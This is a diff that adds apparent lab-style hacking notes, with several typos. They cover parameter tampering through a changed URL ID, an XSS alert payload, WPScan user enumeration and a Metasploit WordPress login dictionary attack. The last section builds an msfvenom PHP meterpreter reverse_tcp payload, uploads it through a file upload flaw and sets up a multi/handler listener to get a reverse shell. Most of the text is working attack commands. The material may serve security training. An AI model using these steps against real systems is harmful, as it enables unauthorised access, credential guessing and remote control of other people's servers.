@@ -6,3 +6,54 @@ In the login page, enter username: john, password: test
 After login, vie Profile. After redirecting to the profile page for John, you see there is "ID" in the url data is setto a number.
 
 Now try to change the ID from 2 to 1 and press Enter, you will be redirected to another user profile called "Sam". Now try other ID numbers, you get different user profiles. 
+
+Note: This proces of changing the ID values and getting the result is known as PARAMETER TAMPERING. 
+Web cross-site scripting (XSS or CSS) attacks exploits vulnerabilities in dynamically geenerated web pages. This enables malicious attackers to inject client-slide scripts
+into web pages viewed by other users.
+Inject <script>alert("Hacked")</script> into any fields, suchas contacts or login info. If this were to be successful, then you will receive a pop-up displaying the message
+"Hacked" 
+
+###Enumerating and Hacking a Web Application using WPScan and Metasploit###
+
+
+In Kali Linux
+
+wpscan --url http://example.com/ --enumerate -u 
+
+To launch msfconsole, we need to enable postgresql service. Service postgresql start
+
+Then, msfconsoole. 
+wodpress_login_enum auxiliary module
+use auxiliary/scanner/http/wordpress_login_enum 
+ *This module allows to enumerate wordpress login creds. 
+ Now, show options
+ set PASS_FILE Password.txt (We will be performing the dictionary attack) 
+ set RHOSTs <Ip of the Target> 
+ set Rport <port of the machine  i.e., 80> 
+ 
+ set TARGETURI <path to the login page> 
+ 
+ set USERNAME <username> 
+ Finally, run. 
+ 
+ ###Exploiting File Upload Vulnerability at Different Security Levels###
+ 
+ Requirements: Windows server to run WAMPServer
+ In Kali linux, we generate a payload. 
+ msfvenom -p phpmeterpreter/reverse_tcp lhost=<ip address> lport=4444 -f raw
+ *Now copy the payload and save to a file with .php extension because we will be exploiting php server. Now go the the server you want to upload your generated php
+ payload and upload the file. 
+ 
+ In order to intercept the request send to the server, we need to setup meterpreter server. 
+ 
+ type msfconsole
+ use multi/handler
+ set payload php/meterpreter/reverse_tcp
+ set lhost <host ip> 
+ set lport <host port to listen to> 
+ run 
+ 
+ Since the meterpreter session is running, now call the file you just uploaded in order to create a reverse shell. 
+ 
+ This can be accomplished by simply, typing http://example.com/upload/files/paload.php
+ And this will give us the meterpreter session. 
